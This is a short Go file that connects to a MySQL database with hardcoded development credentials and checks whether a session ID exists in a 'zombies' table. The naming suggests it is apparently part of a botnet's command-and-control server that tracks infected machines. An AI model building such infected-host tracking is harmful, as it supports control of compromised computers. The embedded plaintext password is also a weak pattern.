package main

import (
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
)

// TODO: put this as env vars to avoid leaks (i dont know how to manage it now)
// NOTE: its some random password / usrname, to use in a dev env only, not production !!!
const DB_HOST = "localhost"
const DB_PORT = 3306
const DB_NAME = "hba_db"
const DB_USR = "hba_user"
const DB_PWD = "hbaPass123"

func InitDb() (*sql.DB, error) {
	var db *sql.DB
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s", DB_USR, DB_PWD, DB_HOST, DB_PORT, DB_NAME)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return nil, fmt.Errorf("Error connecting to DB : %v", err)
	}

	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("Error verifying DB : %v", err)
	}

	return db, nil

}

func ZAvailability(sessionId string, db *sql.DB) bool {

	query := "SELECT SessionId FROM zombies WHERE SessionId = ?"

	var retrievedSessionId string
	err := db.QueryRow(query, sessionId).Scan(&retrievedSessionId)

	if err != nil {
		if err == sql.ErrNoRows {
			DbgMsgEx("[ZAVLBLT] Zombie not found", true)
			return false
		}

		log.Fatal(err)
	}
	DbgMsgEx("[ZAVLBLT] Zombie found", true)
	return true
}
